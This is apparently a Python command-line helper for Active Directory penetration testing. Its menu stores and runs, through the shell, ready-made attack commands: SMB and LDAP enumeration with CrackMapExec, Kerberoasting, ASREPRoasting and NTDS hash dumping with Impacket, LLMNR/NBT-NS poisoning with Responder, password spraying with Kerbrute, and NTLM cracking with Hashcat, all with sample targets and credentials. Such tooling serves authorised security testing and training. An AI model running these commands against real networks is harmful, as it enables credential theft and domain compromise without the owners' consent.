import subprocess
import readline
import cmd
import re
import os

class Tool:
    def __init__(self, name):
        self.name = name
        self.options = []

    def add_option(self, name, description, command, example):
        self.options.append({'name': name, 'description': description, 'command': command, 'example': example})

    def display_options(self):
        print(f"Options for {self.name}:")
        for i, option in enumerate(self.options, start=1):
            print(f"{i}) {option['description']}")

    def handle_options(self, option):
        try:
            option = int(option)
            selected_option = self.options[option - 1]
            print(f"\n{selected_option['name']}\nDescription: {selected_option['description']}\nUsage: {selected_option['command']}\nExample: {selected_option['example']}\n")
            return selected_option['command']
        except (ValueError, IndexError):
            return "Invalid option"

#CrackMapExec
crackmapexec = Tool("CrackMapExec")
crackmapexec.add_option("Enumerate Shares", "Enumerate SMB shares with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --shares", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --shares")
crackmapexec.add_option("Enumerate Users", "Enumerate users on the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --users", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --users")
crackmapexec.add_option("Enumerate Groups", "Enumerate groups on the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --groups", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --groups")
crackmapexec.add_option("Better way of enumerating shares/users/groups", "Enumerate shares/users/groups on the target using SMB with guest authentication\n Note: this only works if IPC$ share is readable", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --shares --rid-brute 10000", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --shares --rid-brute 10000")
crackmapexec.add_option("Enumerate Password Policy", "Enumerate the password policy for the target using SMB with guest authentication", "crackmapexec smb <target_ip> -u '<username>' -p '<password>' --pass-pol", "crackmapexec smb 172.16.5.7 -u 'Guest' -p '' --pass-pol")
crackmapexec.add_option("Enumerate LDAP", "Enumerate LDAP domain/local groups, users/descriptions, users trusted for delegation, and users without a password with crackmapexec", "crackmapexec ldap <target_ip> -u '<username>' -p '<password>' --trusted-for-delegation --password-not-required --admin-count --users --groups", "crackmapexec ldap 172.16.5.7 -u 'admin' -p 'Password1' --trusted-for-delegation --password-not-required --admin-count --users --groups")

#Impacket
impacket = Tool("Impacket")
impacket.add_option("Kerberoast Attack", "Perform a kerberoast attack with impacket-GetUserSPNs", "impacket-GetUserSPNs <domain_name>/<username>:<password>@<target_ip>", "impacket-GetUserSPNs megacorp.local/admin:Password1@")
impacket.add_option("ASREPRoast Attack", "Perform an ASREPRoast attack with impacket-GetNPUsers", "impacket-GetNPUsers <domain_name>/<username>:<password>@<target_ip> -request", "impacket-GetNPUsers megacorp.local/admin:Password1@ -request")
impacket.add_option("dump NTDS AD database to receieve NTLM hashes", "dump NTDS AD database to receieve NTLM hashes with impacket-secretsdump", "impacket-secretsdump -just-dc <domain_name>/<username>:<password>@<target_ip> -use-vss", "impacket-secretsdump -just-dc megacorp.local/admin:Password1@ -use-vss")

#Responder
responder = Tool("Responder")
responder.add_option("analysis mode", "Start Responder in analysis mode", "responder -I <interface> -A", "responder -I eth0 -A")
responder.add_option("network traffic response spoofing", "Start Responder in network traffic response spoofing mode", "responder -I <interface> -w -d", "responder -I eth0 -w -d")
responder.add_option("LLMNR/NBT-NS/MDNS poisoner", "Start Responder in LLMNR/NBT-NS/MDNS poisoner mode", "responder -I <interface> -wrf", "responder -I eth0 -wrf")

#Kerbrute
kerbrute = Tool("Kerbrute")
kerbrute.add_option("enumerate valid AD users for password spraying", "Enumerate valid AD users for password spraying with kerbrute", "kerbrute userenum --dc <target_ip> -d <domain_name> <user_list> -o kerb-results", "kerbrute userenum --dc 172.16.5.7 -d megacorp.local users.txt -o kerb-results")
kerbrute.add_option("password spray", "Perform a password spraying attack using kerbrute", "kerbrute passwordspray --dc <target_ip> -d <domain_name> <user_list> <password_list/password>", "kerbrute passwordspray --dc 172.16.5.7 -d megacorp.local users.txt passwords.txt/Welcome1")

#Hashcat
hashcat = Tool("Hashcat")
hashcat.add_option("NTLM hash cracking", "Crack NTLM hashes with hashcat", "hashcat -m 1000 <hash_file> <wordlist>", "hashcat -m 1000 hash.txt rockyou.txt")
hashcat.add_option("NTLMv2 hash cracking", "Crack NTLMv2 hashes with hashcat", "hashcat -m 5600 <hash_file> <wordlist>", "hashcat -m 5600 hash.txt rockyou.txt")

def run_command(command, output_file=None):
    history_file = os.path.expanduser('~/.ad_pentest_history')

    if os.path.exists(history_file):
        readline.read_history_file(history_file)

    placeholders = re.findall(r"<(.*?)>", command)
    replacements = {}

    for placeholder in placeholders:
        replacements[placeholder] = input(f"Enter {placeholder.replace('_', ' ')}: ")
    
    for placeholder, replacement in replacements.items():
        command = command.replace(f"<{placeholder}>", replacement)

    print("\n-----------Running command-----------\n")
    # Saves output to file if paramater is specified
    if output_file:
        with open(output_file, "w") as f:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
            for line in iter(process.stdout.readline, ''):
                print(line, end='')
                f.write(line)
    else:
        subprocess.run(command, shell=True)
    print("\n")

    readline.add_history(command)
    readline.write_history_file(history_file)

    if output_file:
        print("-----------Saving output-----------\n")

# Displays all options that contain the search term in the description
def module_search(tools):

    search = input("\nEnter search term (q to quit): ").split(" ")
    if search[0] == "q":
        exit()

    print("\n-----------Search results-----------\n")

    # Search through all tools and options and print then be able to select one
    options = []
    for tool in tools:
        for option in tool.options:
            if all(term.lower() in option['description'].lower() for term in search):
                options.append(option)
                print(f"{len(options)}) {tool.name}: {option['description']}")

    if not options:
        return "0 results found"

    option = input("\nEnter the number of the option (q to quit): ")
    if option == "q":
        exit()

    try:
        option = int(option)
        selected_option = options[option - 1]
        print(f"\n{selected_option['name']}\nDescription: {selected_option['description']}\nUsage: {selected_option['command']}\nExample: {selected_option['example']}\n")
        return selected_option['command']
    except (ValueError, IndexError):
        return "Invalid option"
    

# Displays a list of ad tools in numerical order
def ad_help_list():
    tools = [crackmapexec, impacket, responder, kerbrute, hashcat]

    print("Select a tool:")
    for i, tool in enumerate(tools, start=1):
        print(f"{i}) {tool.name}")
    # for searching functionality
    print(f"{len(tools) + 1}) Search through all tools and options")
    print(f"{len(tools) + 2}) Go through previous commands with arrow keys and tab completion")
    print(f"{len(tools) + 3}) Quit")

    tool_choice = input("\nEnter the number of the tool (q to quit): ")

    if tool_choice == "q":
        exit()

    try:
        if int(tool_choice) == len(tools) + 1:
            command = module_search(tools)

            if command != "Invalid option" and command != "0 results found" and command is not None:
                inp = input("Do you want to run the command selected? (Y/y) ")
                if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                    # Add user specified options to command
                    inp = input("Do you want to add any options to the command? (Y/y) ")
                    if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                        command += " " + input("Enter options (Ex: -u http://127.0.0.1 -w rockyou.txt): ")
                    # output to file
                    inp = input("Do you want to save the output to a file? (Y/y) ")
                    if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                        output_file = input("Enter the name of the output file: ")
                        run_command(command, output_file=output_file)
                    else:
                        run_command(command)
            else:
                # If the command is invalid or there are no results, return the appropriate error
                return command
        elif int(tool_choice) == len(tools) + 2:
            readline.parse_and_bind('tab: complete')
            readline.parse_and_bind('set editing-mode vi')
            readline.read_history_file(os.path.expanduser('~/.ad_pentest_history'))
            while True:
                try:
                    command = input("ad_pentest> ")
                    if command == "exit" or command == "quit":
                        exit()
                    else:
                        run_command(command)
                except KeyboardInterrupt:
                    exit()
                except Exception as e:
                    print(e)
        elif int(tool_choice) == len(tools) + 3:
            exit()
        else:
            tool_choice = int(tool_choice)
            selected_tool = tools[tool_choice - 1]

            selected_tool.display_options()
            option = input("\nEnter the number of the option (q to quit): ")

            if option == "q":
                exit()

            return selected_tool.handle_options(option)
    except (ValueError, IndexError):
        return "Invalid option"

if __name__ == "__main__":

    print("""\n
    _    ____    _   _      _
   / \  |  _ \  | | | | ___| |_ __   ___ _ __
  / _ \ | | | | | |_| |/ _ \ | '_ \ / _ \ '__|
 / ___ \| |_| | |  _  |  __/ | |_) |  __/ |
/_/   \_\____/  |_| |_|\___|_| .__/ \___|_|
                             |_|\n
    """)

    subprocess.run("touch ~/.ad_pentest_history", shell=True)

    command = ad_help_list()

    if command != "Invalid option" and command != "0 results found" and command is not None:
        # run command
        inp = input("Do you want to run the command selected? (Y/y) ")
        if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
            # Add user specified options to command
            inp = input("Do you want to add any options to the command? (Y/y) ")
            if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                command += " " + input("Enter options (Ex: -u http://127.0.0.1 -w rockyou.txt): ")
            # output to file
            inp = input("Do you want to save the output to a file? (Y/y) ")
            if inp == "y" or inp == "Y" or inp == "Yes" or inp == "yes":
                output_file = input("Enter the name of the output file: ")
                run_command(command, output_file=output_file)
            else:
                run_command(command)
    else:
        if command == None:
            exit()
        # If the command is invalid or there are no results, return the appropriate error
        print(command + "\n")
